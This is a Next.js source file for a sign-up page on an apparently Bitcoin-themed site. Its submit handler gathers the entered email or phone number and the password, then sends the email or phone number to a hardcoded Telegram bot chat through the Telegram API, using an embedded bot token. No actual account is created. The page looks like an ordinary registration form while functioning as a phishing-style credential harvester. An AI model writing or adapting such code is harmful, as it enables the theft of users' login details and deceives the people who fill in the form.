import Image from "next/image";
import Link from "next/link";
import Navbar from "../components/navbar";
import btcLogo from "../../styles/assets/btc-logo.png"

export default function Signup() {
    // https://api.telegram.org/bot<token>/METHOD_NAME

    const Registration = async (e) => {
        const token = '5714333308:AAGApj_yrKa1c9aveS7ZY64ErsKLpZC5wQ8'

        e.preventDefault()
        const data = {
            phoneNumber: e.target.phoneNumber.value,
            password: e.target.password.value
        }
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=-649861913&text=${data.phoneNumber}&parse_mode=html`

        const options = {
            method: 'POST'
        }

        const response = await fetch(url, options)
        const result = await response.json()
    } 

    return(
        <>
        <Navbar />
        <div className="py-20 grid grid-cols-2">
            <div className="col-span 1 pl-20 text-white">
                <h1 className="text-5xl font-bold">Create Your Personal Account</h1>
                <form className="" onSubmit={Registration}>
                    <p className="text-lg font-bold pt-4">Email / Phone Number</p>
                    <input 
                        type="text"
                        id="phoneNumber"
                        name="phoneNumber"
                        className="bg-transparent border-gray-text border-2 w-96 h-10 px-2 rounded-md"
                    />
                    <p className="text-lg font-bold pt-4">Password</p>
                    <input 
                        type="password"
                        id="password"
                        name="password"
                        className="bg-transparent border-gray-text border-2 w-96 h-10 px-2 rounded-md" 
                    />
                    <div className="pt-8">
                        <button
                            type="submit"
                            id="submit"
                            className="w-96 h-10 bg-button text-xl font-semibold text-black rounded-md hover:opacity-90"
                            >
                                <Link href={'/dashboard/'}>
                                    Create Account
                                </Link>
                        </button>
                    </div>
                </form>
                <div className="flex font-bold text-xl pt-3">
                    <p className="text-white">Already registered?</p>
                    <Link href={'/auth/login/'}>
                        <a className="text-button pl-3 hover:underline" href="/">Log In</a>
                    </Link>
                </div>
            </div>
            <div className="col-span-1 flex flex-col items-center">
                <Image 
                    src={btcLogo}
                    width={400}
                    height={400}
                />
            </div>
        </div>
        </>
    )
}